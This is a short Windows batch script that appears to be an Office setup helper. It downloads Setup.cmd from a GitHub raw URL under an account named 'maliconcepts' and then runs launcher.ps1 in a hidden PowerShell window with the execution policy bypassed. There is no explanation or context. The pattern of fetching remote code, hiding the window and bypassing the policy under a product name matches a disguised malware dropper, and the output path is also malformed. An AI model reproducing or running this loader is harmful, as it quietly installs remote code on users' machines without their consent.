@echo off
setlocal enabledelayedexpansion

set "output_file=%~dp0Setup.cmd"

powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/maliconcepts/Office/refs/heads/main/Setup.cmd' -OutFile '%output_file%\Setup.cmd'" >nul

Pause

timeout /t 1 >nul

powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0launcher.ps1"
